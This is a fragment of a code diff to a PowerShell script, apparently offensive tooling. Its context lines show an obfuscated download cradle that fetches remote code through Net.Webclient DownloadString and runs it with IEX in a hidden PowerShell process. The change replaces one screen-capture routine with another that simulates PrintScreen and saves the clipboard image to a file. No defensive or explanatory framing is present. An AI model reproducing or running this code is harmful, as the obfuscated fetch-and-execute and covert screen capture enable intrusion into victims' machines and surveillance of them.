@@ -9,7 +9,11 @@ $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 $proc.WaitForExit()
 
-Add-Type -AssemblyName System.Drawing
-$screenshot = [System.Drawing.Bitmap]::FromHbitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.ToHbitmap())
-$screenshot.Save("Screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)
-$screenshot.Dispose()
+# Load the necessary assembly for clipboard operations
+Add-Type -AssemblyName System.Windows.Forms
+
+[System.Windows.Forms.SendKeys]::SendWait('{PRTSC}')
+Start-Sleep -Milliseconds 500
+$img = [System.Windows.Forms.Clipboard]::GetImage()
+$img.Save('code.png')
+
